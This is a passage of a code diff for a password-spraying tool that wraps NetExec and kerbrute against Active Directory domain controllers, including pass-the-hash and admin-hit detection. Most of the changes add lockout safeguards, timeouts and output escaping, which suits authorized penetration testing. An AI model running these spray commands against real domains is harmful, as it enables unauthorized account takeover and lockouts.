     def compute_effective_chain(self, full_chain: List["Engine"]) -> List["Engine"]:
         """
         Compute the per-password effective failover chain based on engine health.
-        Healthy + probe engines (cooldown expired) lead in original order.
-        Demoted-in-cooldown engines trail as last-resort safety net.
+        Healthy and due-for-probe engines retain original order. Engines still
+        in cooldown are omitted rather than used as an undocumented fallback.
         """
-        leading, trailing = [], []
+        available = []
         for eng in full_chain:
             h = self.engine_health.get(str(eng))
             if not h or not h["demoted"] or h["cooldown_remaining"] == 0:
-                leading.append(eng)  # healthy, or probe (cooldown expired)
-            else:
-                trailing.append(eng)  # demoted, last resort only
-        return leading + trailing
+                available.append(eng)
+        return available
+
+    def select_demoted_probe(
+        self,
+        full_chain: List["Engine"],
+        already_tried: Set[str],
+    ) -> Optional["Engine"]:
+        """Select one explicitly requested probe without silently bypassing cooldown."""
+        for engine in full_chain:
+            key = str(engine)
+            health = self.engine_health.get(key, {})
+            if health.get("demoted") and key not in already_tried:
+                return engine
+        return None
 
     def render_timeline_html(self) -> str:
         """Generate self-contained HTML timeline visualization."""
@@ -1008,22 +2849,22 @@ class State:
 
         # Color scheme for event types
         colors = {
-            "round_start": "#3498db",      # blue
+            "batch_start": "#3498db",      # blue
             "spray": "#9b59b6",            # purple
             "credential": "#27ae60",       # green
             "lockout": "#e67e22",          # orange
             "reprioritize": "#f39c12",     # yellow
             "throttle": "#e74c3c",         # red
             "schedule_wait": "#1abc9c",    # teal
-            "round_end": "#95a5a6",        # gray
+            "batch_end": "#95a5a6",        # gray
             "complete": "#2ecc71",         # bright green
         }
 
         html_parts = ["<!DOCTYPE html><html><head>"]
         html_parts.append("<meta charset='UTF-8'>")
-        html_parts.append("<title>Spraygun Timeline</title>")
+        html_parts.append(f"<title>{PRODUCT_NAME} Timeline</title>")
         html_parts.append("<style>")
-        html_parts.append("body { font-family: 'Segoe UI, Tahoma, sans-serif; margin: 0; padding: 20px; background: #1e1e1e; color: #d4d4d4; }")
+        html_parts.append("body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 20px; background: #1e1e1e; color: #d4d4d4; }")
         html_parts.append(".container { max-width: 1200px; margin: 0 auto; }")
         html_parts.append("h1 { color: #4ec9b0; border-bottom: 2px solid #4ec9b0; padding-bottom: 10px; }")
         html_parts.append(".event { margin: 10px 0; padding: 12px; border-left: 4px solid #666; background: #2d2d2d; border-radius: 4px; }")
@@ -1032,22 +2873,22 @@ class State:
         html_parts.append(".ts { color: #888; font-size: 0.85em; }")
         html_parts.append(".type { font-weight: bold; text-transform: uppercase; font-size: 0.75em; padding: 2px 6px; border-radius: 3px; margin-right: 8px; }")
         html_parts.append(".detail { color: #aaa; font-size: 0.9em; margin-left: 8px; }")
-        html_parts.append(".round-tag { background: #444; padding: 2px 6px; border-radius: 3px; font-size: 0.75em; margin-left: 8px; }")
+        html_parts.append(".batch-tag { background: #444; padding: 2px 6px; border-radius: 3px; font-size: 0.75em; margin-left: 8px; }")
         html_parts.append(".summary { background: #252525; padding: 15px; border-radius: 5px; margin: 20px 0; }")
         html_parts.append(".summary h2 { margin-top: 0; color: #4ec9b0; }")
         html_parts.append("</style></head><body>")
 
         html_parts.append("<div class='container'>")
-        html_parts.append("<h1>Spraygun Timeline</h1>")
+        html_parts.append(f"<h1>{PRODUCT_NAME} Timeline</h1>")
 
         # Summary section
         html_parts.append("<div class='summary'>")
         html_parts.append("<h2>Summary</h2>")
-        html_parts.append(f"<p>Started: {self.start_time}</p>")
+        html_parts.append(f"<p>Started: {html.escape(self.start_time)}</p>")
         html_parts.append(f"<p>Total events: {len(events)}</p>")
-        html_parts.append(f"<p>Credentials found: {len(self.found_creds)}</p>")
-        html_parts.append(f"<p>Lockouts: {len(self.locked_users)}</p>")
-        html_parts.append(f"<p>Rounds completed: {self.completed_rounds}</p>")
+        html_parts.append(f"<p>Credentials found: {self.credential_count}</p>")
+        html_parts.append(f"<p>Lockout signals: {self.lockout_count}</p>")
+        html_parts.append(f"<p>Batches completed: {self.completed_rounds}</p>")
         html_parts.append("</div>")
 
         # Events list
@@ -1055,13 +2896,14 @@ class State:
         for ev in events:
             etype = ev.get("type", "unknown")
             color = colors.get(etype, "#666")
-            html_parts.append(f"<div class='event event-{etype}'>")
-            html_parts.append(f"<div class='ts'>{ev['ts']}</div>")
-            html_parts.append(f"<span class='type' style='background: {color}'>{etype}</span>")
-            if ev.get("round"):
-                html_parts.append(f"<span class='round-tag'>Round {ev['round']}</span>")
+            safe_type = html.escape(str(etype), quote=True)
+            html_parts.append(f"<div class='event event-{safe_type}'>")
+            html_parts.append(f"<div class='ts'>{html.escape(str(ev['ts']))}</div>")
+            html_parts.append(f"<span class='type' style='background: {color}'>{safe_type}</span>")
+            if ev.get("batch"):
+                html_parts.append(f"<span class='batch-tag'>Batch {html.escape(str(ev['batch']))}</span>")
             if ev.get("detail"):
-                html_parts.append(f"<span class='detail'>{ev['detail']}</span>")
+                html_parts.append(f"<span class='detail'>{html.escape(str(ev['detail']))}</span>")
             html_parts.append("</div>")
 
         html_parts.append("</div></body></html>")
@@ -1071,7 +2913,11 @@ class State:
 # Engine invocation and classification
 # =============================================================================
 
-def classify_line(engine: Engine, line: str) -> Tuple[LineType, Optional[str]]:
+def classify_line(
+    engine: Engine,
+    line: str,
+    expected_secret: Optional[str] = None,
+) -> Tuple[LineType, Optional[str]]:
     """
     Classify a tool output line.
     Returns (LineType, extracted_data) where data depends on type:
@@ -1079,117 +2925,368 @@ def classify_line(engine: Engine, line: str) -> Tuple[LineType, Optional[str]]:
     - LOCKOUT: username
     - Others: None
     """
-    line_upper = line.upper()
+    # Kerbrute uses ANSI colors even when its output is piped. Strip them for
+    # stable matching while retaining the original line in logs/the live feed.
+    parsed_line = ANSI_ESCAPE_RE.sub("", line)
+    status_text = parsed_line
+    if expected_secret is not None:
+        secret_marker = f":{expected_secret}"
+        marker_offset = parsed_line.find(secret_marker)
+        if marker_offset >= 0:
+            status_text = parsed_line[marker_offset + len(secret_marker):]
 
     if engine.tool == "nxc":
-        # Success
-        for pat in NXC_SUCCESS_PATTERNS:
-            if re.search(pat, line):
-                # Extract DOMAIN\user:password
-                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+):(\S+)", line)
-                if m:
-                    domain, user, secret = m.groups()
-                    # Check if this is an admin/pwn3d user
-                    for admin_pat in NXC_ADMIN_PATTERNS:
-                        if re.search(admin_pat, line, re.IGNORECASE):
-                            return (LineType.ADMIN, f"{user}:{secret}")
-                    return (LineType.SUCCESS, f"{user}:{secret}")
-        # Lockout
+        marker_match = re.search(r"\[[+-]\](.*)$", parsed_line)
+        marker_text = marker_match.group(1) if marker_match else parsed_line
+        identity_match = re.search(
+            r"(?:(?P<domain>[^\\\s:]+)\\)?(?P<user>[^:\s]+):(?P<secret>.*)",
+            marker_text,
+        )
+        reported_user = identity_match.group("user") if identity_match else None
+
+        # Safety classifications must precede the broad NetExec failure matcher.
         for pat in NXC_LOCKOUT_PATTERNS:
-            if re.search(pat, line, re.IGNORECASE):
-                # Try to extract username
-                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+)", line)
-                if m:
-                    return (LineType.LOCKOUT, m.group(2))
-                else:
-                    return (LineType.LOCKOUT, None)
-        # Connection error (for failover counting)
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.LOCKOUT, reported_user)
+        for pat in NXC_AMBIGUOUS_LOCKOUT_PATTERNS:
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.AMBIGUOUS_LOCKOUT, reported_user)
+
         for pat in NXC_CONN_ERROR_PATTERNS:
-            if re.search(pat, line, re.IGNORECASE):
-                return (LineType.CONN_ERROR, None)
-        # Auth failure
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.CONN_ERROR, reported_user)
+        for pat in NXC_FATAL_ERROR_PATTERNS:
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.ERROR, parsed_line)
+
+        for pat in NXC_SUCCESS_PATTERNS:
+            if re.search(pat, parsed_line) and identity_match:
+                user = identity_match.group("user")
+                reported_secret = (
+                    expected_secret
+                    if expected_secret is not None
+                    else identity_match.group("secret")
+                )
+                if expected_secret is None:
+                    reported_secret = re.sub(
+                        r"\s+(?:\(Pwn3d!\)|\[ADMIN\])\s*$",
+                        "",
+                        reported_secret,
+                        flags=re.IGNORECASE,
+                    )
+                for admin_pat in NXC_ADMIN_PATTERNS:
+                    if re.search(admin_pat, status_text, re.IGNORECASE):
+                        return (LineType.ADMIN, f"{user}:{reported_secret}")
+                return (LineType.SUCCESS, f"{user}:{reported_secret}")
+
         for pat in NXC_AUTHFAIL_PATTERNS:
-            if re.search(pat, line, re.IGNORECASE):
-                # Try to extract username for cred-reuse tracking
-                m = re.search(r"([A-Za-z0-9_\-\.\\]+)\\([A-Za-z0-9_\-\.@]+)", line)
-                if m:
-                    return (LineType.AUTHFAIL, m.group(2))  # Return username
-                return (LineType.AUTHFAIL, None)
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.AUTHFAIL, reported_user)
+        if marker_match and marker_match.group(0).startswith("[-]") and identity_match:
+            return (LineType.AUTHFAIL, reported_user)
 
     elif engine.tool == "kerbrute":
-        # Check for realm/domain errors FIRST (highest priority)
+        summary = re.search(r"Done!\s+Tested\s+(\d+)\s+logins?", parsed_line, re.IGNORECASE)
+        if summary:
+            return (LineType.SUMMARY, summary.group(1))
+
+        principal_match = re.search(r"\[!\]\s+([^:\s]+)(?::.*?)?\s+-", parsed_line)
+        if principal_match is None:
+            principal_match = re.search(
+                r"\b([A-Za-z0-9_.\-$]+@[A-Za-z0-9_.-]+)\b",
+                parsed_line,
+            )
+        reported_principal = principal_match.group(1) if principal_match else None
+
+        for pat in KERBRUTE_LOCKOUT_PATTERNS:
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.LOCKOUT, reported_principal)
+        for pat in KERBRUTE_AMBIGUOUS_LOCKOUT_PATTERNS:
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.AMBIGUOUS_LOCKOUT, reported_principal)
+
+        # Realm/domain failures are known not to validate the supplied secret.
         for pat in KERBRUTE_ERROR_PATTERNS:
-            if re.search(pat, line, re.IGNORECASE):
-                return (LineType.ERROR, line)
-        # Success
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.ERROR, parsed_line)
+        for pat in KERBRUTE_CONN_ERROR_PATTERNS:
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.CONN_ERROR, reported_principal)
+
         for pat in KERBRUTE_SUCCESS_PATTERNS:
-            if re.search(pat, line):
-                # Extract user@domain:password
-                m = re.search(r"([A-Za-z0-9_\-\.@]+):(\S+)", line)
+            if re.search(pat, parsed_line, re.IGNORECASE):
+                m = re.search(
+                    r"\[\+\]\s+VALID LOGIN(?: WITH ERROR)?:\s+([^:\s]+):(.+?)\s*$",
+                    parsed_line,
+                    re.IGNORECASE,
+                )
                 if m:
                     user, secret = m.groups()
+                    if "VALID LOGIN WITH ERROR" in parsed_line.upper():
+                        secret = re.sub(r"\s+\([^\n]*\)\s*$", "", secret)
                     return (LineType.SUCCESS, f"{user}:{secret}")
-        # Lockout (best-effort)
-        for pat in KERBRUTE_LOCKOUT_PATTERNS:
-            if re.search(pat, line, re.IGNORECASE):
-                m = re.search(r"([A-Za-z0-9_\-\.@]+)", line)
-                if m:
-                    return (LineType.LOCKOUT, m.group(1))
-                else:
-                    return (LineType.LOCKOUT, None)
-        # Connection error
-        for pat in KERBRUTE_CONN_ERROR_PATTERNS:
-            if re.search(pat, line, re.IGNORECASE):
-                return (LineType.CONN_ERROR, None)
-        # Auth failure
+
+        # In verbose mode every ordinary failure uses this principal-prefixed form.
+        if reported_principal:
+            return (LineType.AUTHFAIL, reported_principal)
         for pat in KERBRUTE_AUTHFAIL_PATTERNS:
-            if re.search(pat, line, re.IGNORECASE):
-                return (LineType.AUTHFAIL, None)
+            if re.search(pat, status_text, re.IGNORECASE):
+                return (LineType.AUTHFAIL, reported_principal)
 
     return (LineType.INFO, None)
+
+
+def _normalize_reported_user(
+    user: str,
+    configured_users: List[str],
+    domain: str = "",
+) -> str:
+    """Map an engine identity back to its configured display spelling."""
+    reported_key = canonical_identity(user, domain)
+    for configured in configured_users:
+        if reported_key == canonical_identity(configured, domain):
+            return configured
+        if str(user).strip().casefold() in _identity_aliases(configured, domain):
+            return configured
+    return str(user).strip()
 
 def spray_one_password(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, realm: Optional[str] = None) -> RoundResult:
     """
     Run one engine invocation for one password/hash. Stream stdout line-by-line,
     classify, update UI/state, and return RoundResult.
-    Connection errors are tracked but don't abort the engine (failover chain handles it).
+    Connection errors and unsuccessful process exits abort this engine attempt
+    so the failover chain can handle the remaining users.
 
     Feature 1 (credential-reuse matrix): Uses a filtered userlist per password.
 
     Args:
         realm: Override domain for kerbrute (realm retry). If None, uses cfg.domain.
     """
-    result = RoundResult()
+    aggregate = RoundResult()
+    if state.signal_count_for_secret(secret) > cfg.lockout_burst:
+        aggregate.aborted = True
+        aggregate.abort_reason = "lockout-burst"
+        return aggregate
+    eligible_users = state.eligible_users_for(secret)
+    if not eligible_users:
+        ui.console.print(
+            "[*] No eligible users remain for this secret; skipping",
+            style="dim",
+        )
+        aggregate.clean_finish = True
+        aggregate.reconciled_complete = True
+        return aggregate
 
-    # Build filtered userlist for this password (skip already-attempted users)
-    userlist_path, user_count = state.build_userlist_for(secret)
+    skipped = len(cfg.users) - len(eligible_users)
+    ui.console.print(
+        f"[*] Strict dispatch: {len(eligible_users)} eligible users "
+        f"({skipped} attempted or quarantined)",
+        style="dim",
+    )
 
-    if user_count == 0:
-        # All users already attempted for this password
-        ui.console.print(f"[*] All {len(cfg.users)} users already attempted for this password; skipping", style="dim")
-        result.clean_finish = True
-        return result
+    for user in eligible_users:
+        # Recheck because a prior result in this pass may have quarantined an
+        # equivalent spelling of this identity.
+        if user not in state.eligible_users_for(secret):
+            continue
+        if not state.begin_attempt(secret, user, engine):
+            continue
+        aggregate.dispatches += 1
 
-    ui.console.print(f"[*] Spraying {user_count} users (skipping {len(cfg.users) - user_count} already attempted)", style="dim")
+        userlist_path = state.write_userlist([user])
+        try:
+            child = _spray_one_password_impl(
+                engine,
+                cfg,
+                secret,
+                ui,
+                state,
+                userlist_path,
+                realm,
+                expected_user=user,
+            )
+        finally:
+            try:
+                Path(userlist_path).unlink()
+            except FileNotFoundError:
+                pass
 
-    # Store original cfg.userfile and restore after
-    original_userfile = cfg.userfile
-    cfg.userfile = userlist_path
+        status = state.pair_status(secret, user)
+        if status == "in_flight":
+            if child.abort_reason in NO_AUTH_ABORT_REASONS:
+                state.cancel_attempt(secret, user)
+            else:
+                state.finish_attempt(
+                    secret,
+                    user,
+                    "indeterminate",
+                    child.abort_reason or "engine ended without a terminal user result",
+                )
+                child.indeterminate_users.add(state._display_user(user))
 
+        _merge_round_result(aggregate, child)
+
+        if state.signal_count_for_secret(secret) > cfg.lockout_burst:
+            aggregate.aborted = True
+            aggregate.abort_reason = "lockout-burst"
+            aggregate.clean_finish = False
+            aggregate.reconciled_complete = False
+            ui.set_abort(aggregate.abort_reason)
+            return aggregate
+
+        if child.aborted:
+            aggregate.aborted = True
+            aggregate.abort_reason = child.abort_reason
+            aggregate.clean_finish = False
+            aggregate.reconciled_complete = False
+            return aggregate
+
+        if not child.reconciled_complete:
+            aggregate.aborted = True
+            aggregate.abort_reason = "unreconciled-output"
+            aggregate.clean_finish = False
+            aggregate.reconciled_complete = False
+            return aggregate
+
+    aggregate.clean_finish = True
+    aggregate.reconciled_complete = True
+    return aggregate
+
+
+def _merge_round_result(target: RoundResult, source: RoundResult) -> None:
+    """Merge one strict per-identity result into a pass result."""
+    for pair in source.successes:
+        if pair not in target.successes:
+            target.successes.append(pair)
+    for pair in source.admin_users:
+        if pair not in target.admin_users:
+            target.admin_users.append(pair)
+    target.lockouts.update(source.lockouts)
+    target.ambiguous_lockouts.update(source.ambiguous_lockouts)
+    target.unknown_lockouts += source.unknown_lockouts
+    target.unknown_ambiguous_lockouts += source.unknown_ambiguous_lockouts
+    target.conn_fails += source.conn_fails
+    target.errors.extend(source.errors)
+    target.terminal_users.update(source.terminal_users)
+    target.indeterminate_users.update(source.indeterminate_users)
+    if source.summary_tested is not None:
+        target.summary_tested = (target.summary_tested or 0) + source.summary_tested
+
+
+def _stop_process(proc: Optional[subprocess.Popen]) -> None:
+    """Best-effort termination for an engine process and its descendants."""
+    if proc is None:
+        return
+    pid = getattr(proc, "pid", None)
+    group_id = pid if isinstance(pid, int) and pid > 0 and hasattr(os, "killpg") else None
+    group_signaled = False
     try:
-        result = _spray_one_password_impl(engine, cfg, secret, ui, state, userlist_path, realm)
+        # start_new_session=True makes the child PID its process-group ID. Use
+        # that known ID directly: getpgid(pid) fails if a short-lived wrapper
+        # exits while a grandchild still owns the stdout pipe.
+        if group_id is not None:
+            try:
+                os.killpg(group_id, signal.SIGTERM)
+                group_signaled = True
+            except (OSError, ProcessLookupError):
+                group_signaled = False
+        if not group_signaled and proc.poll() is None:
+            proc.terminate()
 
-        # Feature 1: For kerbrute, mark all users as attempted on clean finish
-        # (kerbrute doesn't emit per-user lines for failures)
-        if result.clean_finish and engine.tool == "kerbrute":
-            remaining_users = [u for u in cfg.users if u not in state.attempted_matrix.get(secret, set())]
-            state.mark_attempted_batch(secret, remaining_users)
+        deadline = time.monotonic() + 2
+        if proc.poll() is None:
+            try:
+                proc.wait(timeout=max(0.05, deadline - time.monotonic()))
+            except subprocess.TimeoutExpired:
+                pass
 
-    finally:
-        # Restore original userfile
-        cfg.userfile = original_userfile
+        group_alive = group_signaled
+        if group_signaled and group_id is not None:
+            while time.monotonic() < deadline:
+                try:
+                    os.killpg(group_id, 0)
+                except ProcessLookupError:
+                    group_alive = False
+                    break
+                except PermissionError:
+                    group_alive = True
+                else:
+                    group_alive = True
+                time.sleep(0.05)
 
-    return result
+        if group_alive and group_id is not None:
+            try:
+                os.killpg(group_id, signal.SIGKILL)
+            except (OSError, ProcessLookupError):
+                pass
+        if proc.poll() is None:
+            try:
+                proc.kill()
+            finally:
+                try:
+                    proc.wait(timeout=1)
+                except subprocess.TimeoutExpired:
+                    pass
+    except OSError:
+        # The child may have exited between poll() and terminate().
+        return
+
+
+class EngineOutputTimeout(TimeoutError):
+    def __init__(self, reason: str):
+        super().__init__(reason)
+        self.reason = reason
+
+
+def _iter_process_output(
+    proc: subprocess.Popen,
+    *,
+    total_timeout: int,
+    idle_timeout: int,
+):
+    """Yield child output while enforcing total and no-output deadlines."""
+    events: queue.Queue = queue.Queue()
+    eof = object()
+
+    def read_stdout() -> None:
+        try:
+            if proc.stdout is not None:
+                for output_line in proc.stdout:
+                    events.put(output_line)
+        except BaseException as exc:  # Forward reader failures to the owner thread.
+            events.put(exc)
+        finally:
+            events.put(eof)
+
+    reader = threading.Thread(target=read_stdout, name="authtempo-engine-output", daemon=True)
+    reader.start()
+    started = time.monotonic()
+    last_output = started
+
+    while True:
+        now = time.monotonic()
+        total_remaining = total_timeout - (now - started)
+        idle_remaining = idle_timeout - (now - last_output)
+        if total_remaining <= 0:
+            raise EngineOutputTimeout("engine-timeout")
+        if idle_remaining <= 0:
+            raise EngineOutputTimeout("idle-timeout")
+        try:
+            event = events.get(timeout=min(total_remaining, idle_remaining))
+        except queue.Empty as exc:
+            now = time.monotonic()
+            reason = (
+                "engine-timeout"
+                if now - started >= total_timeout
+                else "idle-timeout"
+            )
+            raise EngineOutputTimeout(reason) from exc
+        if event is eof:
+            return
+        if isinstance(event, BaseException):
+            raise event
+        last_output = time.monotonic()
+        yield event
 
 
 def spray_kerbrute_with_realm_retry(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State) -> RoundResult:
@@ -1198,9 +3295,22 @@ def spray_kerbrute_with_realm_retry(engine: Engine, cfg: Config, secret: str, ui
     Tries realm candidates (as-given, UPPER, parent, UPPER-parent) until one works.
     Caches the working realm for the rest of the run.
     """
-    # Fast path: already know a working realm
+    # Fast path: already know a working realm. If it is rejected later (for
+    # example after a resumed run points at a changed KDC), invalidate the cache
+    # and fall through to the remaining candidates.
     if state.working_realm:
-        return spray_one_password(engine, cfg, secret, ui, state, state.working_realm)
+        cached_realm = state.working_realm
+        cached_result = spray_one_password(engine, cfg, secret, ui, state, cached_realm)
+        if not (cached_result.aborted and cached_result.abort_reason == "wrong-realm"):
+            return cached_result
+        if cached_realm not in state.known_bad_realms:
+            state.known_bad_realms.append(cached_realm)
+        state.working_realm = None
+        ui.console.print(
+            f"[!] kerbrute: cached realm '{escape(cached_realm)}' was rejected; "
+            "trying remaining variants",
+            style="yellow",
+        )
 
     # Try each untried realm candidate
     candidates = [r for r in cfg.realm_candidates if r not in state.known_bad_realms]
@@ -1214,7 +3324,7 @@ def spray_kerbrute_with_realm_retry(engine: Engine, cfg: Config, secret: str, ui
 
     last_result = None
     for idx, realm in enumerate(candidates):
-        ui.console.print(f"[*] kerbrute: trying realm '{realm}' ({idx+1}/{len(cfg.realm_candidates)})", style="cyan")
+        ui.console.print(f"[*] kerbrute: trying realm '{escape(realm)}' ({idx+1}/{len(candidates)})", style="cyan")
         result = spray_one_password(engine, cfg, secret, ui, state, realm)
 
         if result.aborted and result.abort_reason == "wrong-realm":
@@ -1226,9 +3336,15 @@ def spray_kerbrute_with_realm_retry(engine: Engine, cfg: Config, secret: str, ui
 
         # Not a realm abort (success, or different abort) -> realm is acceptable
         if not result.aborted:
-            state.working_realm = realm
-            ui.console.print(f"[+] kerbrute: realm '{realm}' works — cached for the rest of the run", style="green")
-            state.record_timeline_event("realm_found", f"working realm: {realm}")
+            if not result.reconciled_complete:
+                result.aborted = True
+                result.clean_finish = False
+                result.abort_reason = "unreconciled-output"
+                return result
+            if result.dispatches:
+                state.working_realm = realm
+                ui.console.print(f"[+] kerbrute: realm '{realm}' works — cached for the rest of the run", style="green")
+                state.record_timeline_event("realm_found", f"working realm: {realm}")
             return result
 
         # Different abort reason (not realm-related)
@@ -1239,15 +3355,31 @@ def spray_kerbrute_with_realm_retry(engine: Engine, cfg: Config, secret: str, ui
     return last_result if last_result else RoundResult(aborted=True, abort_reason="wrong-realm")
 
 
-def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichUI, state: State, userlist_path: str, realm: Optional[str] = None) -> RoundResult:
+def _spray_one_password_impl(
+    engine: Engine,
+    cfg: Config,
+    secret: str,
+    ui: RichUI,
+    state: State,
+    userlist_path: str,
+    realm: Optional[str] = None,
+    expected_user: Optional[str] = None,
+) -> RoundResult:
     """
     Internal implementation of spray_one_password after userlist filtering.
-    Connection errors are tracked but don't abort (failover chain handles it).
+    Connection errors and unsuccessful process exits abort this engine attempt
+    so the failover chain can handle it.
 
     Args:
         realm: Override domain for kerbrute (realm retry). If None, uses cfg.domain.
     """
     result = RoundResult()
+    saw_auth_result = False
+    expected_user = expected_user or next(
+        (line.strip() for line in Path(userlist_path).read_text(encoding="utf-8").splitlines() if line.strip()),
+        "",
+    )
+    expected_key = canonical_identity(expected_user, cfg.domain) if expected_user else ""
 
     if cfg.dry_run:
         # Simulate tool output for --dry-run mode
@@ -1258,7 +3390,8 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
             dry_run_users = [line.strip() for line in f if line.strip()]
 
         for user in dry_run_users:
-            state.mark_attempted(secret, user)
+            state.mark_attempted(secret, user, status="dry_run")
+            result.terminal_users.add(state._display_user(user))
 
         # Simulate some fake lines based on round
         for i in range(5):
@@ -1272,14 +3405,17 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
             elif line_type == LineType.CONN_ERROR:
                 result.conn_fails += 1
                 ui.increment_conn_fails()
-                # Don't abort on conn-fail-limit in dry-run either
+                # Dry-run lines are synthetic and never reach a real threshold.
             time.sleep(0.1)
 
         result.clean_finish = not result.aborted
+        result.reconciled_complete = not result.aborted
         return result
 
     # Build command
     cmd: List[str] = []
+
+    secret_file_path: Optional[str] = None
 
     if engine.tool == "nxc":
         binary = cfg.nxc_binary
@@ -1292,7 +3428,7 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
         cmd = [binary]
 
         if engine.protocol == "smb":
-            cmd.extend(["smb", cfg.dc_ip])
+            cmd.extend(["smb", cfg.dc_ip, "-d", cfg.domain])
         elif engine.protocol == "ldap":
             cmd.extend(["ldap", cfg.dc_ip, "-d", cfg.domain])
         else:
@@ -1301,7 +3437,31 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
             result.abort_reason = "invalid-protocol"
             return result
 
-        cmd.extend(["-u", userlist_path, "-H" if cfg.pth_mode else "-p", secret])
+        # NetExec defaults to a large worker pool (256 in current releases).
+        # Keep only one authentication in flight so terminating on a lockout
+        # signal actually prevents later queued users from being attempted.
+        cmd.extend(["--threads", "1"])
+        secret_fd, secret_file_path = tempfile.mkstemp(
+            prefix=".secret-",
+            suffix=".txt",
+            dir=state.log_dir,
+        )
+        try:
+            os.fchmod(secret_fd, 0o600)
+            with os.fdopen(secret_fd, "w", encoding="utf-8") as secret_handle:
+                secret_fd = -1
+                secret_handle.write(secret + "\n")
+                secret_handle.flush()
+                os.fsync(secret_handle.fileno())
+        finally:
+            if secret_fd >= 0:
+                os.close(secret_fd)
+        cmd.extend([
+            "-u",
+            userlist_path,
+            "-H" if cfg.pth_mode else "-p",
+            secret_file_path,
+        ])
         cmd.append("--continue-on-success")
 
     elif engine.tool == "kerbrute":
@@ -1318,7 +3478,26 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
             result.abort_reason = "binary-not-found"
             return result
 
-        cmd = [binary, "passwordspray", "--dc", cfg.dc_ip, "-d", realm or cfg.domain, userlist_path, secret]
+        # Kerbrute's own safe mode aborts as soon as any user is reported locked
+        # out. One worker prevents already-in-flight parallel attempts from
+        # continuing after that signal. AuthTempo also watches the stream below,
+        # so a changed Kerbrute exit code cannot accidentally turn this into
+        # failover.
+        cmd = [
+            binary,
+            "passwordspray",
+            "--safe",
+            "-v",
+            "--threads",
+            "1",
+            "--dc",
+            cfg.dc_ip,
+            "-d",
+            realm or cfg.domain,
+            "--",
+            userlist_path,
+            secret,
+        ]
 
     else:
         ui.console.print(f"[!] Unknown engine tool: {engine.tool}", style="red")
@@ -1327,8 +3506,21 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
         return result
 
     # Spawn subprocess
-    ui.console.print(f"[*] Running: {' '.join(cmd[:3])}... (secret masked)", style="dim")
+    if cfg.verbose:
+        masked_cmd = list(cmd)
+        if engine.tool == "kerbrute":
+            masked_cmd[-1] = "***"
+        else:
+            secret_flag = "-H" if cfg.pth_mode else "-p"
+            if secret_flag in masked_cmd:
+                secret_idx = masked_cmd.index(secret_flag) + 1
+                if secret_idx < len(masked_cmd):
+                    masked_cmd[secret_idx] = "***"
+        ui.console.print(f"[*] Running: {escape(shlex.join(masked_cmd))}", style="dim")
+    else:
+        ui.console.print(f"[*] Running: {escape(' '.join(cmd[:3]))}... (secret masked)", style="dim")
 
+    proc: Optional[subprocess.Popen] = None
     try:
         proc = subprocess.Popen(
             cmd,
@@ -1336,10 +3528,17 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
             stderr=subprocess.STDOUT,
             text=True,
             bufsize=1,
+            start_new_session=True,
         )
+        state.active_process = proc
+        seen_signal_lines: Set[str] = set()
 
         # Stream output
-        for line in proc.stdout:
+        for line in _iter_process_output(
+            proc,
+            total_timeout=cfg.engine_timeout_seconds,
+            idle_timeout=cfg.engine_idle_timeout_seconds,
+        ):
             line = line.rstrip()
             if not line:
                 continue
@@ -1352,37 +3551,175 @@ def _spray_one_password_impl(engine: Engine, cfg: Config, secret: str, ui: RichU
             ui.feed_line(line)
 
             # Classify
-            line_type, data = classify_line(engine, line)
+            line_type, data = classify_line(engine, line, expected_secret=secret)
 
             if line_type == LineType.SUCCESS and data:
+                saw_auth_result = True
                 if ":" not in data:
                     ui.console.print(f"[!] Unparseable credential line (skipped): {line}", style="yellow")
                 else:
-                    user, secret_hit = data.split(":", 1)
-                    result.successes.append((user, secret_hit))
+                    reported_user, _reported_secret = data.split(":", 1)
+                    user = _normalize_reported_user(reported_user, cfg.users, cfg.domain)
+                    if expected_key and canonical_identity(user, cfg.domain) != expected_key:
+                        result.aborted = True
+                        result.abort_reason = "identity-mismatch"
+                        result.errors.append(f"expected {expected_user}, parsed {user}")
+                        _stop_process(proc)
+                        break
+                    # The invoked secret is authoritative; tool output may add
+                    # status markers or formatting after it.
+                    secret_hit = secret
+                    pair = (user, secret_hit)
+                    if pair not in result.successes:
+                        result.successes.append(pair)
+                    result.terminal_users.add(user)
                     ui.update_success(user, secret_hit)
-                    state.add_cred(user, secret_hit, is_admin=False)
-                    state.mark_attempted(secret, user)  # Feature 1: Track attempted pair
+                    state.finish_attempt(
+                        secret,
+                        user,
+                        "success",
+                        persist=False,
+                    )
+                    state.add_cred(
+                        user,
+                        secret_hit,
+                        is_admin=False,
+                        engine=str(engine),
+                        persist=False,
+                    )
+                    state.save()
 
             elif line_type == LineType.ADMIN and data:
+                saw_auth_result = True
                 if ":" not in data:
                     ui.console.print(f"[!] Unparseable admin line (skipped): {line}", style="yellow")
                 else:
-                    user, secret_hit = data.split(":", 1)
-                    result.admin_users.append((user, secret_hit))
+                    reported_user, _reported_secret = data.split(":", 1)
+                    user = _normalize_reported_user(reported_user, cfg.users, cfg.domain)
+                    if expected_key and canonical_identity(user, cfg.domain) != expected_key:
+                        result.aborted = True
